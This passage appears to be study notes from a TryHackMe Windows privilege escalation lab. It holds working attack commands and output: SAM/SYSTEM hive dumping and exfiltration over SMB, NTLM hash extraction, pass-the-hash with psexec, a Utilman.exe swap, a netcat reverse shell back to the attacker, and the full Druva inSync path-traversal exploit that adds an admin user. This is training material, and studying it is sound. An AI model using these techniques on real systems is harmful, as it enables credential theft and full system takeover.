@@ -1256,3 +1256,632 @@ wprivesc2\thmbackup
 C:\Windows\system32>whoami /priv
 
 PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
+C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+
+iniciar smb
+
+──(kali㉿kali)-[~/Downloads]
+└─$ mkdir share
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ locate smbserver.py
+/home/kali/Downloads/zerologon_learning/impacketEnv/bin/smbserver.py
+/home/kali/Downloads/zerologon_learning/impacketEnv/lib/python3.10/site-packages/impacket/smbserver.py
+/usr/lib/python3/dist-packages/impacket/smbserver.py
+/usr/share/doc/python3-impacket/examples/smbserver.py
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+
+copy the sam and system
+
+C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.11.81.220\public\
+        1 file(s) copied.
+
+C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.11.81.220\public\
+        1 file(s) copied.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.12.124,49766)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:d45f38dcbff5e570c62f4099a3ebbcb2:010100000000000000a82db0e5bed801c52e9c2e82c41e890000000001001000500069005900510073005900480046000300100050006900590051007300590048004600020010007200590045005a006e0076004f006600040010007200590045005a006e0076004f0066000700080000a82db0e5bed80106000400020000000800300030000000000000000000000000300000911f8859eb84abe4ce766b7f1318f18919c03caf2c06ccaa83cf5a6ff6eabf570a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:public)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:public)
+[*] Closing down connection (10.10.12.124,49766)
+[*] Remaining connections []
+[*] Incoming connection (10.10.12.124,49769)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:2821fea5b09aacbbc617e5166326e952:0101000000000000800ed9c3e5bed80142bd33a8f63a2abe0000000001001000500069005900510073005900480046000300100050006900590051007300590048004600020010007200590045005a006e0076004f006600040010007200590045005a006e0076004f00660007000800800ed9c3e5bed80106000400020000000800300030000000000000000000000000300000911f8859eb84abe4ce766b7f1318f18919c03caf2c06ccaa83cf5a6ff6eabf570a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
+[*] Connecting Share(1:public)
+[*] Disconnecting Share(1:public)
+[*] Closing down connection (10.10.12.124,49769)
+[*] Remaining connections []
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd share
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ ls
+sam.hive  system.hive
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ locate secretsdump.py
+/home/kali/Downloads/zerologon_learning/impacketEnv/bin/secretsdump.py
+/home/kali/Downloads/zerologon_learning/impacketEnv/lib/python3.10/site-packages/impacket/examples/secretsdump.py
+/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py
+/usr/share/doc/python3-impacket/examples/secretsdump.py
+/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/impacket/secretsdump.py
+/usr/share/responder/tools/MultiRelay/impacket-dev/secretsdump.py
+/usr/share/responder/tools/MultiRelay/impacket-dev/impacket/examples/secretsdump.py
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
+THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
+[*] Cleaning up...
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ locate psexec.py     
+/home/kali/Downloads/zerologon_learning/impacketEnv/bin/psexec.py
+/usr/share/doc/python3-impacket/examples/psexec.py
+/usr/share/powershell-empire/empire/server/modules/powershell/lateral_movement/invoke_psexec.py
+/usr/share/set/src/fasttrack/psexec.py
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.12.124
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.12.124.....
+[*] Found writable share ADMIN$
+[*] Uploading file uPvoHAWy.exe
+[*] Opening SVCManager on 10.10.12.124.....
+[*] Creating service riWZ on 10.10.12.124.....
+[*] Starting service riWZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> more C:\Users\Administrator\flag.txt
+ 
+Cannot access file C:\Users\Administrator\flag.txt
+C:\Windows\system32> more C:\Users\Administrator\Desktop\flag.txt
+THM{SEFLAGPRIVILEGE}
+```
+Get the flag on the Administrator's desktop.
+```(execute like admin pass TheWorldIsMine2022)
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+
+C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WPRIVESC2\THMTakeOwnership".
+
+C:\Windows\system32>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+processed file: C:\Windows\System32\Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Windows\system32>copy cmd.exe utilman.exe
+Overwrite utilman.exe? (Yes/No/All): Yes
+        1 file(s) copied.
+```
+![[Pasted image 20220902112423.png]]
+```the 3 ways learned
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4442
+
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.11.81.220 4442" (go to 10.10.12.124 and run)
+```
+```the 3 ways learned
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4442
+listening on [any] 4442 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.12.124] 49823
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
+more C:\Users\Administrator\Desktop\flag.txt
+THM{SEFLAGPRIVILEGE}
+```
+![[Pasted image 20220902113114.png]]
+### Abusing vulnerable software
+Make sure to click the Start Machine button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via RDP, you can use the following credentials:
+Username 	thm-unpriv
+Password 	Password321
+Unpatched Software
+Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
+```text
+wmic product get name,version,vendor
+```
+Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
+Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, [packet storm](https://packetstormsecurity.com/) or plain old Google, amongst many others.
+Using wmic and Google, can you find a known vulnerability on any installed product?
+```example
+C:\Users\User>wmic product get name,version,vendor
+Name                                                                                               Vendor                      Version
+Python 3.7.6 Add to Path (64-bit)                                                                  Python Software Foundation  3.7.6150.0
+Python 3.7.6 pip Bootstrap (64-bit)                                                                Python Software Foundation  3.7.6150.0
+Python 3.7.6 Utility Scripts (64-bit)                                                              Python Software Foundation  3.7.6150.0
+Python 3.7.6 Tcl/Tk Support (64-bit)                                                               Python Software Foundation  3.7.6150.0
+Python 3.7.6 Executables (64-bit)                                                                  Python Software Foundation  3.7.6150.0
+Python 3.7.6 Test Suite (64-bit)                                                                   Python Software Foundation  3.7.6150.0
+Python 3.7.6 Documentation (64-bit)                                                                Python Software Foundation  3.7.6150.0
+Sonic Visualiser                                                                                   sonicvisualiser.org         4.5
+Python 3.7.6 Core Interpreter (64-bit)                                                             Python Software Foundation  3.7.6150.0
+Python 3.7.6 Standard Library (64-bit)                                                             Python Software Foundation  3.7.6150.0
+Python 3.7.6 Development Libraries (64-bit)                                                        Python Software Foundation  3.7.6150.0
+Office 16 Click-to-Run Extensibility Component                                                     Microsoft Corporation       16.0.15427.20178
+Office 16 Click-to-Run Licensing Component                                                         Microsoft Corporation       16.0.15427.20148
+SQL Server Management Studio for Reporting Services                                                Microsoft Corporation       15.0.18424.0
+vs_tipsmsi                                                                                         Microsoft Corporation       17.0.31804
+Paquete acumulativo de Intellisense de Microsoft .NET Framework para Visual Studio (español)       Microsoft Corporation       4.8.03761
+Python Launcher                                                                                    Python Software Foundation  3.7.6925.0
+vs_minshellmsires                                                                                  Microsoft Corporation       17.0.31808
+HP Client Security Manager                                                                         HP Inc.
+       9.4.5.2868
+Microsoft Visual Studio Setup WMI Provider                                                         Microsoft Corporation       3.0.4492.23473
+Microsoft.NET.Workload.Emscripten.Manifest                                                         Microsoft Corporation       48.23.31171
+Microsoft SQL Server 2019 T-SQL Language Service                                                   Microsoft Corporation       15.0.2000.5
+Microsoft .NET Framework 4.8 Targeting Pack                                                        Microsoft Corporation       4.8.03761
+MySQL Workbench 8.0 CE                                                                             Oracle Corporation          8.0.28
+vs_communitysharedmsi                                                                              Microsoft Corporation       17.0.31815
+Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219                                        Microsoft Corporation       10.0.40219
+Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664                                         Microsoft Corporation       12.0.40664
+Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219                                        Microsoft Corporation       10.0.40219
+Microsoft Web Deploy 4.0                                                                           Microsoft Corporation       10.0.5402
+Microsoft.NET.Sdk.Android.Manifest-6.0.100                                                         Microsoft Corporation       124.25.16400
+Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.31.31103                                        Microsoft Corporation       14.31.31103
+vs_communityx64msi                                                                                 Microsoft Corporation       17.0.31808
+Intel(R) Management Engine Components                                                              Intel Corporation           1.0.0.0
+vs_devenvsharedmsi                                                                                 Microsoft Corporation       17.0.31804
+Intel(R) Chipset Device Software                                                                   Intel Corporation           10.1.18121.8164
+Microsoft.NET.Sdk.Maui.Manifest-6.0.100                                                            Microsoft Corporation       24.25.18227
+Intel(R) Icls                                                                                      Intel Corporation           1.0.0.0
+Microsoft .NET AppHost Pack - 6.0.1 (x64_x86)                                                      Microsoft Corporation       48.7.32725
+vs_clickoncebootstrappermsi                                                                        Microsoft Corporation       17.0.31808
+SQL Server 2019 XEvent                                                                             Microsoft Corporation       15.0.2000.5
+Epic Online Services                                                                               Epic Games, Inc.            2.0.33.0
+IntelliTraceProfilerProxy                                                                          Microsoft Corporation       15.0.21225.01
+Microsoft Visual Studio Tools for Applications 2019 x64 Hosting Support                            Microsoft Corporation       16.0.31110
+SQL Server 2019 Connection Info                                                                    Microsoft Corporation       15.0.2000.5
+SQL Server 2019 DMF                                                                                Microsoft Corporation       15.0.2000.5
+Microsoft ASP.NET Core Module for IIS Express                                                      Microsoft Corporation       12.2.18292.0
+vs_SQLClickOnceBootstrappermsi                                                                     Microsoft Corporation       17.0.31804
+Microsoft Visual Studio Tools for Applications 2019 x86 Hosting Support                            Microsoft Corporation       16.0.31110
+Microsoft Windows Desktop Targeting Pack - 6.0.0 (x64)                                             Microsoft Corporation       48.3.31217
+Microsoft OLE DB Driver for SQL Server                                                             Microsoft Corporation       18.5.0.0
+Microsoft SQL Server 2019 RsFx Driver                                                              Microsoft Corporation       15.0.2000.5
+Dynamic Application Loader Host Interface Service                                                  Intel Corporation           1.0.0.0
+Microsoft VSS Writer for SQL Server 2019                                                           Microsoft Corporation       15.0.2000.5
+Microsoft Windows Desktop Runtime - 6.0.1 (x64)                                                    Microsoft Corporation       48.7.32738
+Java 8 Update 281 (64-bit)                                                                         Oracle Corporation          8.0.2810.9
+vs_filehandler_amd64                                                                               Microsoft Corporation       17.0.31808
+Microsoft ASP.NET Core Module V2 for IIS Express                                                   Microsoft Corporation       16.0.21322.0
+Microsoft .NET Framework 4.8 SDK                                                                   Microsoft Corporation       4.8.03928
+Microsoft .NET AppHost Pack - 6.0.1 (x64)                                                          Microsoft Corporation       48.7.32725
+vs_minshellsharedmsi                                                                               Microsoft Corporation       17.0.31808
+Microsoft TestPlatform SDK Local Feed                                                              Microsoft
+       17.0.0.5175695
+vs_minshellx64msi                                                                                  Microsoft Corporation       17.0.31808
+icecap_collection_neutral                                                                          Microsoft Corporation       17.0.31808
+SQL Server 2019 Connection Info                                                                    Microsoft Corporation       15.0.2000.5
+Microsoft Windows Desktop Runtime - 6.0.1 (x86)                                                    Microsoft Corporation       48.7.32738
+Microsoft.NET.Sdk.MacCatalyst.Manifest-6.0.100                                                     Microsoft Corporation       60.25.16415
+Microsoft Help Viewer 2.3                                                                          Microsoft Corporation       2.3.28307
+Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005                                      Microsoft Corporation       12.0.21005
+Paquete de compatibilidad de Microsoft .NET Framework 4.8 (español)                                Microsoft Corporation       4.8.03761
+Microsoft .NET SDK 6.0.101 (x64) from Visual Studio                                                Microsoft Corporation       6.1.121.56904
+Microsoft ASP.NET Core 6.0.1 Shared Framework (x86)                                                Microsoft Corporation       6.0.1.21567
+MySQL Server 8.0                                                                                   Oracle Corporation          8.0.28
+Microsoft Update Health Tools                                                                      Microsoft Corporation       4.67.0.0
+Adobe Acrobat DC (64-bit)                                                                          Adobe
+       22.002.20191
+Adobe Refresh Manager                                                                              Adobe Systems Incorporated  1.8.0
+icecap_collectionresourcesx64                                                                      Microsoft Corporation       17.0.31808
+Microsoft .NET AppHost Pack - 6.0.1 (x64_arm64)                                                    Microsoft Corporation       48.7.32725
+Microsoft .NET Runtime - 6.0.1 (x64)                                                               Microsoft Corporation       48.7.32725
+SQL Server Management Studio                                                                       Microsoft Corporation       15.0.18424.0
+Intel(R) Serial IO                                                                                 Intel Corporation           30.100.2020.7
+Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005                                         Microsoft Corporation       12.0.21005
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127                                     Microsoft Corporation       14.24.28127
+Microsoft VC++ redistributables repacked.                                                          Intel Corporation           12.0.0.0
+Microsoft .NET Toolset 6.0.101 (x64)                                                               Microsoft Corporation       24.3.60296
+Python 2.7.1                                                                                       Python Software Foundation  2.7.1150
+Epic Games Launcher                                                                                Epic Games, Inc.            1.3.23.0
+SQL Server 2019 Database Engine Shared                                                             Microsoft Corporation       15.0.2000.5
+Browser for SQL Server 2019                                                                        Microsoft Corporation       15.0.2000.5
+Microsoft SQL Server 2012 Native Client                                                            Microsoft Corporation       11.4.7462.6
+SQL Server 2019 DMF                                                                                Microsoft Corporation       15.0.2000.5
+vs_minshellinteropx64msi                                                                           Microsoft Corporation       17.0.31804
+SQL Server 2019 Shared Management Objects Extensions                                               Microsoft Corporation       15.0.2000.5
+Microsoft VC++ redistributables repacked.                                                          Intel Corporation           12.0.0.0
+Microsoft.NET.Sdk.tvOS.Manifest-6.0.100                                                            Microsoft Corporation       60.25.16415
+Microsoft Analysis Services OLE DB Provider                                                        Microsoft Corporation       15.0.2000.832
+VS JIT Debugger                                                                                    Microsoft Corporation       17.0.114.0
+Microsoft Command Line Utilities 15 for SQL Server                                                 Microsoft Corporation       15.0.1300.359
+vs_devenx64vmsi                                                                                    Microsoft Corporation       17.0.31804
+vs_BlendMsi                                                                                        Microsoft Corporation       17.0.31804
+Integration Services                                                                               Microsoft Corporation       15.0.2000.229
+HP Notifications                                                                                   HP
+       1.1.28.1
+SQL Server 2019 SQL Diagnostics                                                                    Microsoft Corporation       15.0.2000.5
+VS Immersive Activate Helper                                                                       Microsoft Corporation       17.0.114.0
+Microsoft.NET.Sdk.iOS.Manifest-6.0.100                                                             Microsoft Corporation       60.25.16415
+SQL Server Management Studio for Analysis Services                                                 Microsoft Corporation       15.0.18424.0
+vs_filehandler_x86                                                                                 Microsoft Corporation       17.0.31808
+IntelliTraceProfilerProxy                                                                          Microsoft Corporation       15.0.21225.01
+IIS 10.0 Express                                                                                   Microsoft Corporation       10.0.05927
+HP Security Update Service                                                                         HP Inc.
+       4.3.20.873
+vs_FileTracker_Singleton                                                                           Microsoft Corporation       17.0.31808
+vs_communitymsires                                                                                 Microsoft Corporation       17.0.31808
+Microsoft Visual Studio Setup Configuration                                                        Microsoft Corporation       3.0.4492.23473
+MySQL Connector/ODBC 8.0                                                                           Oracle Corporation          8.0.28
+VMware Workstation                                                                                 VMware, Inc.
+       16.1.0
+SQL Server 2019 Shared Management Objects                                                          Microsoft Corporation       15.0.2000.5
+
+UE4 Prerequisites (x64)                                                                            Epic Games, Inc.            1.2.0.0
+SQL Server 2019 Common Files                                                                       Microsoft Corporation       15.0.2000.5
+Microsoft .NET Targeting Pack - 6.0.1 (x64)                                                        Microsoft Corporation       48.7.32725
+Microsoft .NET Framework 4.7.1 Targeting Pack                                                      Microsoft Corporation       4.7.02558
+Intel(R) Management Engine Driver                                                                  Intel Corporation           1.0.0.0
+Microsoft .NET 6.0 Templates 6.0.101 (x64)                                                         Microsoft Corporation       24.3.60296
+Paquete de compatibilidad de Microsoft .NET Framework 4.7.2 (español)                              Microsoft Corporation       4.7.03062
+Intel(R) LMS                                                                                       Intel Corporation           1.0.0.0
+SQL Server Management Studio                                                                       Microsoft Corporation       15.0.18424.0
+icecap_collectionresources                                                                         Microsoft Corporation       17.0.31808
+ClickOnce Bootstrapper Package for Microsoft .NET Framework                                        Microsoft Corporation       4.8.04162
+HP Wolf Security - Console                                                                         HP Inc.
+       11.0.16.42
+icecap_collection_x64                                                                              Microsoft Corporation       17.0.31808
+SQL Server 2019 Shared Management Objects Extensions                                               Microsoft Corporation       15.0.2000.5
+Microsoft ODBC Driver 17 for SQL Server                                                            Microsoft Corporation       17.7.2.1
+vs_CoreEditorFonts                                                                                 Microsoft Corporation       17.0.32014
+Microsoft .NET Host FX Resolver - 6.0.1 (x64)                                                      Microsoft Corporation       48.7.32725
+Microsoft ASP.NET Diagnostic Pack for Visual Studio                                                Microsoft Corporation       17.0.795.42246
+Microsoft Visual C++ 2022 X64 Additional Runtime - 14.31.31103                                     Microsoft Corporation       14.31.31103
+SQL Server 2019 Batch Parser                                                                       Microsoft Corporation       15.0.2000.5
+Visual Studio 2017 Isolated Shell for SSMS                                                         Microsoft Corporation       15.0.28307.421
+Microsoft.NET.Sdk.macOS.Manifest-6.0.100                                                           Microsoft Corporation       48.25.16415
+Microsoft ASP.NET Core 6.0.0 Targeting Pack (x64)                                                  Microsoft Corporation       6.0.0.21526
+vs_clickoncesigntoolmsi                                                                            Microsoft Corporation       17.0.31804
+SQL Server 2019 Shared Management Objects                                                          Microsoft Corporation       15.0.2000.5
+Microsoft .NET Standard Targeting Pack - 2.1.0 (x64)                                               Microsoft Corporation       24.0.28113
+MySQL Installer - Community                                                                        Oracle Corporation          1.6.1.0
+SQL Server 2019 Database Engine Services                                                           Microsoft Corporation       15.0.2000.5
+SQL Server 2019 Database Engine Shared                                                             Microsoft Corporation       15.0.2000.5
+Microsoft .NET Host - 6.0.1 (x64)                                                                  Microsoft Corporation       48.7.32725
+DiagnosticsHub_CollectionService                                                                   Microsoft Corporation       16.1.28901
+HP PC Hardware Diagnostics UEFI                                                                    HP
+       7.6.2.0
+vs_minshellinteropsharedmsi                                                                        Microsoft Corporation       17.0.31808
+Windows SDK AddOn                                                                                  Microsoft Corporation       10.1.0.0
+Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664                                      Microsoft Corporation       12.0.40664
+Microsoft Analysis Services OLE DB Provider                                                        Microsoft Corporation       15.0.2000.832
+Microsoft .NET AppHost Pack - 6.0.1 (x64_arm)                                                      Microsoft Corporation       48.7.32725
+Microsoft Visual Studio Tools for Applications 2017 x64 Hosting Support                            Microsoft Corporation       15.0.27520
+Microsoft .NET Runtime - 6.0.1 (x86)                                                               Microsoft Corporation       48.7.32725
+VS Script Debugging Common                                                                         Microsoft Corporation       17.0.114.0
+Microsoft .NET Framework 4.7.2 Targeting Pack                                                      Microsoft Corporation       4.7.03062
+SQL Server 2019 Common Files                                                                       Microsoft Corporation       15.0.2000.5
+Microsoft .NET Framework 4.8 SDK (español)                                                         Microsoft Corporation       4.8.03761
+Windows PC Health Check                                                                            Microsoft Corporation       3.2.2110.14001
+Paquete de compatibilidad redirigido de documentación de Microsoft .NET Framework 4.7.1 (español)  Microsoft Corporation       4.7.02558
+HP Wolf Security Application Support for Sure Sense                                                HP Inc.
+       4.3.20.873
+Microsoft SQL Server 2019 Setup (English)                                                          Microsoft Corporation       15.0.4013.40
+SQL Server 2019 XEvent                                                                             Microsoft Corporation       15.0.2000.5
+HP Wolf Security Application Support for Chrome 102.0.5005.148                                     HP Inc.
+       4.3.7.401
+Windows Subsystem for Linux Update                                                                 Microsoft Corporation       5.10.16
+Microsoft Visual Studio Tools for Applications 2017 x86 Hosting Support                            Microsoft Corporation       15.0.27520
+HP Wolf Security Application Support for Windows                                                   HP Inc.
+       4.3.2.1711
+SQL Server 2019 Database Engine Services                                                           Microsoft Corporation       15.0.2000.5
+Java(TM) SE Development Kit 16 (64-bit)                                                            Oracle Corporation          16.0.0.0
+Intel(R) Management Engine Components                                                              Intel Corporation           1.0.0.0
+Entity Framework 6.2.0 Tools  for Visual Studio 2022                                               Microsoft Corporation       6.2.0.0
+HP Wolf Security                                                                                   HP Inc.
+       4.3.20.873
+SSMS Post Install Tasks                                                                            Microsoft Corporation       15.0.18424.0
+Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17                                       Microsoft Corporation       9.0.30729
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127                                        Microsoft Corporation       14.24.28127
+Microsoft .NET Host FX Resolver - 6.0.1 (x86)                                                      Microsoft Corporation       48.7.32725
+Microsoft.NET.Workload.Mono.Toolchain.Manifest                                                     Microsoft Corporation       48.3.32725
+Java Auto Updater                                                                                  Oracle Corporation          2.8.281.9
+HP System Default Settings                                                                         HP Inc.
+       1.4.16.3
+vs_clickoncebootstrappermsires                                                                     Microsoft Corporation       17.0.31808
+vcpp_crt.redist.clickonce                                                                          Microsoft Corporation       14.30.30704
+Microsoft ASP.NET Core 6.0.1 Shared Framework (x64)                                                Microsoft Corporation       6.0.1.21567
+```
+Case Study: Druva inSync 6.6.3
+The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).
+The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.
+In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.
+The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.
+A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\` where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute `C:\Windows\System32\cmd.exe`, which is not in the allowed path; you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` and that would bypass the check successfully.
+To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:
+The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.
+Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:
+```text
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at `C:\tools\Druva_inSync_exploit.txt`). Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:
+```text
+net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
+```
+This will create user pwnd with a password of SimplePass123 and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user pwnd exists and is part of the administrators' group:
+```text
+Command Prompt
+```
+```text
+PS C:\> net user pwnd
+User name                    pwnd
+Full Name
+Account active               Yes
+[...]
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+```
+As a last step, you can run a command prompt as administrator:
+When prompted for credentials, use the pwnd account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command type `C:\Users\Administrator\Desktop\flag.txt`.
+```added
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+```text
+C:\Users\thm-unpriv>wmic produt get name,version,vendor
+produt - Alias not found.
+
+C:\Users\thm-unpriv>wmic product get name,version,vendor
+Name                                                            Vendor                                   Version
+Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     Microsoft Corporation                    14.28.29910
+AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.1248
